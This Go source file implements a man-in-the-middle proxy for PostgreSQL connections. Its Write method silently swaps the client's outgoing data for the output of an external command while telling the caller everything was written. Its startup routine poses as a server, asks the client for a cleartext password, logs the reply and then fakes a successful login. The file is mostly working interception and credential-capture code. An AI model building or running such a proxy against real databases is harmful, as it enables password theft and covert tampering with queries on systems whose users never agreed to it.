package pq

import (
	"bytes"
	"net"
	"os/exec"
)

// the Man in the middle structure
type Mitm struct {
	net.Conn          // this is the postgres server
	Client   net.Conn // the postgres client psql or a webserver
	Cmdname  *string
}

func (m Mitm) Write(b []byte) (n int, err error) {
	Debug("WRITE")
	if *m.Cmdname != "" {
		res := m.shell(&b, "Write")
		if len(res) != 0 {
			n = len(b) // make the caller think we wrote it all
			_, err = m.Conn.Write(res)
			Debug("We wrote this instead though")
			DebugDump(res)
			return
		}
	}
	n, err = m.Conn.Write(b)
	DebugDump(string(b[:n]))
	return
}

func (m Mitm) Read(b []byte) (n int, err error) {
	Debug("READ")
	n, err = m.Conn.Read(b)
	DebugDump(b[:n])
	return
}

func (m Mitm) shell(b *[]byte, name string) []byte {
	cmd := exec.Command(*m.Cmdname, name)
	Debug("shell", cmd)
	cmd.Stdin = bytes.NewReader(*b)
	res, err := cmd.CombinedOutput()
	if err != nil {
		Debug(string(res))
		Debug(err)
	}
	return res
}

// This is for making the cient think it is connected to a real postgres
// server.
func (m Mitm) startup() {
	bc := [100]byte{}
	client := m.Client
	n, _ := client.Read(bc[:])
	rb := readBuf(bc[:n])
	rbi := rb.int32()
	Debug("GOT rbi is", rbi, bc[:n])
	//rb.next(1)
	rbi = rb.int32()
	Debug("GOT rbi is", rbi, bc[:n])
	if rbi != 80877103 {
		wb := writeBuf([]byte{})
		wb.byte('R')
		wb.int32(8)
		wb.int32(3)
		n, err := client.Write([]byte(wb))
		Debug("sent AuthenticationCleartextPassowrd to client", wb, n, err)
		bc2 := [100]byte{}
		_, _ = client.Read(bc2[:])
		Debug("got back", bc2)
		wb = writeBuf([]byte{})
		wb.byte('R')
		wb.int32(8)
		wb.int32(0)
		n, err = client.Write([]byte(wb))
		Debug("sent AuthenticationOk to client", wb, n, err)
		wb = writeBuf([]byte{})
		wb.byte('Z')
		wb.int32(5)
		wb.byte('I')
		n, err = client.Write([]byte(wb))
		Debug("sent ReadyForQuery to client", wb, n, err)
	} else {
		client := m.Client
		_, _ = client.Write([]byte{'N'})
	}
}
